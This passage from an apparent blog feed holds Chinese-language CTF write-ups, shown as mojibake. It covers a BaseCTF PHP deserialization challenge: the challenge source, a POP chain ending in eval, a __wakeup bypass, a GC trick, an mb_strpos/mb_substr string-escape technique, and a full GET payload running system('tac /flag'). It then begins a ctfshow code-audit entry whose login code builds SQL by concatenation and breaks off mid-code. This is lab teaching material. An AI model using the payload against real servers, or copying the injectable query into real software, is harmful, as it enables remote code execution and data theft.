punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Hacker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$end</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">=</span><span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfer/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hackerï¼'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token function">c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"C"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">T</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$e</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">e</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">R</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$r</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ez_ser.from_you'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$ctf</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&#123;&#123;&#123;'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ez_ser.from_you'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&#125;&#125;&#125;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[|\]/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NONONO!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$pre</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'substr'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"substr"</span><span class="token punctuation">;</span>    <span class="token variable">$ser_ctf</span> <span class="token operator">=</span> <span class="token function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$pre</span><span class="token operator">.</span><span class="token string double-quoted-string">"["</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$ctf</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser_ctf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"æ‚é±¼~æ‚é±¼~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>å…ˆæ˜¯popé“¾å­</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token class-name static-context">Hacker</span><span class="token operator">::</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">C</span><span class="token operator">::</span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">T</span><span class="token operator">::</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">F</span><span class="token operator">::</span><span class="token function">__get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">E</span><span class="token operator">::</span><span class="token function">__isset</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token class-name static-context">R</span><span class="token operator">::</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æ¥ç€æ˜¯ç»• <code>__wakeup</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">start</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ä¸‹è¾¹æœ‰ä¸€ä¸ªèµ‹å€¼çš„æ“ä½œï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨å¼•ç”¨ç»•è¿‡ï¼Œå½“<code>end</code>å’Œ<code>username</code>ç›¸äº’å¼•ç”¨æ—¶ï¼Œä¿®æ”¹<code>end</code>çš„å€¼ä¹Ÿæ˜¯åœ¨ä¿®æ”¹<code>username</code>çš„å€¼ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span></code></pre><p>æ¥ç€æ˜¯ç»•è¿‡<code>throw new Exception(&quot;æ‚é±¼~æ‚é±¼~&quot;);</code>ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªå¼‚å¸¸æŠ›å‡ºï¼Œä½¿å¾—<code>__destruct</code>å¹¶ä¸èƒ½è§¦å‘ï¼Œè¿™æ—¶å°±éœ€è¦ä½¿ç”¨gcå›æ”¶çš„æœºåˆ¶ï¼Œä½¿<code>__destruct</code>æå‰è§¦å‘ï¼Œè®©<code>pop</code>é“¾èƒ½å¤Ÿå¾€åèµ°</p><p>å‚è€ƒè¿æ¥ï¼š<a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">PHPååºåˆ—åŒ–</a></p><p>Pop:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Hacker</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$start</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$end</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">T</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$t</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">F</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">E</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$e</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__isset</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">e</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">R</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$r</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hacker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">end</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">T</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">E</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">e</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">R</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">start</span><span class="token operator">-></span><span class="token property">c</span><span class="token operator">-></span><span class="token property">t</span><span class="token operator">-></span><span class="token property">f</span><span class="token operator">-></span><span class="token property">e</span><span class="token operator">-></span><span class="token property">r</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1'</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'2'</span><span class="token operator">=></span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// a:2:&#123;i:1;O:6:"Hacker":3:&#123;s:5:"start";O:1:"C":1:&#123;s:1:"c";O:1:"T":1:&#123;s:1:"t";O:1:"F":1:&#123;s:1:"f";O:1:"E":1:&#123;s:1:"e";O:1:"R":1:&#123;s:1:"r";s:20:"system('tac /flag');";&#125;&#125;&#125;&#125;&#125;s:3:"end";N;s:8:"username";R:9;&#125;i:1;N;&#125;</span></span></code></pre><p>å°†æœ€å<code>i:2;N;</code>æ›¿æ¢ä¸º<code>i:1;N;</code>åˆ©ç”¨gcå›æ”¶ä½¿<code>__destruct</code>æå‰è§¦å‘</p><p>ç‰¹æ®Šå˜é‡å <code>ez_ser.from_you</code>ï¼Œä¼ å…¥<code>ez[ser.from_you</code>å³å¯ç»•è¿‡</p><p>æ¥ä¸‹æ¥å°±æ˜¯å­—ç¬¦ä¸²é€ƒé€¸</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å‚è€ƒé“¾æ¥ <a href="https://chenxi9981.github.io/ctfshow_XGCTF_%E8%A5%BF%E7%93%9C%E6%9D%AF/">CTFshow_XGCTF_Ezzz_php</a>  <a href="https://www.cnblogs.com/gxngxngxn/p/18187578">mb_strposä¸mb_substræ‰§è¡Œå·®å¼‚å¯¼è‡´çš„æ¼æ´</a></p><pre class="language-bash" data-language="bash"><code class="language-bash">æ¯å‘é€ä¸€ä¸ª%f0abcï¼Œmb_strposè®¤ä¸ºæ˜¯4ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®3ä¸ªå­—èŠ‚æ¯å‘é€ä¸€ä¸ª%f0%9fab,mb_strposè®¤ä¸ºæ˜¯3ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®2ä¸ªå­—èŠ‚æ¯å‘é€ä¸€ä¸ª%f0%9f%9fa,mb_strposè®¤ä¸ºæ˜¯2ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯1ä¸ªå­—èŠ‚ï¼Œç›¸å·®1ä¸ªå­—èŠ‚</code></pre><p><img src="ez_php.png" loading="lazy"></p><p><img src="ez_php2.png" loading="lazy"></p><p>äºæ˜¯æ„é€ ç»•è¿‡ä¹‹å‰å¤šä½™å­—ç¬¦ä¸²</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">210</span><span class="token punctuation">:</span>"<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span></code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">?</span>substr<span class="token operator">=</span><span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span>f0abc<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">&amp;</span>ez<span class="token punctuation">[</span>ser<span class="token operator">.</span>from_you<span class="token operator">=</span>a<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Hacker"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"start"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"C"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"c"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"T"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"t"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"F"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"f"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"E"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"R"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"system('tac /flag');"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"end"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token constant">R</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>i<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BaseCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-ä»£ç å®¡è®¡</title>
      <link href="/2024/08/15/web%E5%85%A5%E9%97%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/08/15/web%E5%85%A5%E9%97%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="web301-310"><a href="#web301-310" class="headerlink" title="web301-310"></a>web301-310</h3><h4 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require</span> <span class="token string single-quoted-string">'conn.php'</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userid'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$userpwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'userpwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select sds_password from sds_user where sds_username='"</span><span class="token operator">.</span><span class="token variable">$username</span><span class="token operator">.</span><span class="token string double-quoted-string">"' order by id limit 1;"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_BOTH</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">&lt;</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token variable">$userpwd</span><span class="token punctuation">,</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sds_password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span 